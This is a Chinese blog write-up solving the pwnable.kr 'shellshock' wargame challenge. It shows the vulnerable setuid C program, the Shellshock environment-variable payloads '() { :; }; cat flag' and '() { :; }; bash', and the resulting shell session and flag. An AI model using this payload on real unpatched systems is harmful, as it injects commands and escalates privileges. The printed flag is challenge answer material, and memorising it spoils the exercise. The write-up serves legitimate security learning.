---
id: 56
title: pwnable.kr-shellshock
date: 2016-07-25T14:08:18+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=56
permalink: /pwnable-kr-shellshock/
categories:
  - pwn
tags:
  - bash
  - payload
  - pwn
  - pwnable.kr
  - shellshock
---
题目描述：

> Mommy, there was a shocking news about bash.
  
> I bet you already know, but lets just make it sure 🙂
  
> ssh shellshock@pwnable.kr -p2222 (pw:guest)

shellshock.c的源码为：

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
</pre>

顾名思义了，这题就是需要利用shellshock漏洞来获取flag，具体的讲解参见：http://www.myhack58.com/Article/html/3/62/2015/60779.htm

所以我们构造payload：export foo='() { :; }; cat flag‘直接获取flag，或者export foo='() { :; }; bash&#8217;切换成shellshock2用户的bash，然后再执行命令获取flag：

> shellshock@ubuntu:/home/shellshock$ export foo='() { :; }; bash&#8217;
  
> shellshock@ubuntu:/home/shellshock$ ./shellshock
  
> shellshock@ubuntu:/home/shellshock$
  
> shellshock@ubuntu:/home/shellshock$
  
> shellshock@ubuntu:/home/shellshock$ cat flag
  
> only if I knew CVE-2014-6271 ten years ago..!!
  
> shellshock@ubuntu:/home/shellshock$ cat flag
  
> only if I knew CVE-2014-6271 ten years ago..!!
  
> shellshock@ubuntu:/home/shellshock$ whoami
  
> shellshock
  
> shellshock@ubuntu:/home/shellshock$ cat flag
  
> only if I knew CVE-2014-6271 ten years ago..!!
  
> shellshock@ubuntu:/home/shellshock$ id
  
> uid=1048(shellshock) gid=1049(shellshock2) groups=1048(shellshock)

最后的flag为：only if I knew CVE-2014-6271 ten years ago..!!